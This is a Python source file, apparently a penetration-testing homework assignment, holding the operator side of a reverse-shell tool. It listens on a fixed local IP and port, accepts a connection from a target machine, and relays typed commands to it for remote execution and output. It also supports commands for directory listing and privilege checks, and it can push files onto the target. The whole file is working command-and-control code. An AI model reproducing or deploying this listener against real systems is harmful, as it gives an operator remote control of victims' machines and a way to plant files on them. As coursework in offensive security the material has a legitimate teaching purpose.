import os
import socket

# Function to send a file from server to client [cite: 315]
def doSend(conn, sourcePath, destinationPath, fileName):
    if os.path.exists(sourcePath + fileName):
        with open(sourcePath + fileName, 'rb') as sourceFile:
            packet = sourceFile.read(5000)
            while len(packet) > 0:
                conn.send(packet)
                packet = sourceFile.read(5000)
            conn.send('DONE'.encode())
            print('[+] File transfer completed')
    else:
        conn.send('File not found'.encode())
        print('[-] Unable to find the source file')

def connect():
    s = socket.socket() # Apply socket programming [cite: 298]
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # Update IP to your specific server machine [cite: 299]
    s.bind(("192.168.220.128", 8080)) 
    s.listen(1)
    
    print("="*60)
    print(" HOMEWORK-02: PENETRATION TESTING TOOL")
    print("="*60)
    print('[+] Listening for TCP connection...')
    
    conn, addr = s.accept()
    print('[+] Established connection with:', addr)

    while True:
        command = input("Shell> ") # User-friendly interaction [cite: 329]
        
        if 'terminate' in command:
            conn.send('terminate'.encode())
            break
        
        # Requirement: Send Files to Target [cite: 315, 316]
        elif 'send' in command:
            try:
                # Format: send*C:\Dest\Path\*file.txt
                sendCmd, destination, fileName = command.split("*")
                source = input("Server source path: ")
                conn.send(command.encode())
                doSend(conn, source, destination, fileName)
            except ValueError:
                print("[-] Format: send*<dest_path>*<file_name>")
        
        else:
            # Requirements: Shell execution, CWD, Directory Listing, and Privilege Check [cite: 304, 307, 309, 311]
            conn.send(command.encode())
            print(conn.recv(5000).decode())

def main():
    connect()

if __name__ == "__main__":
    main()
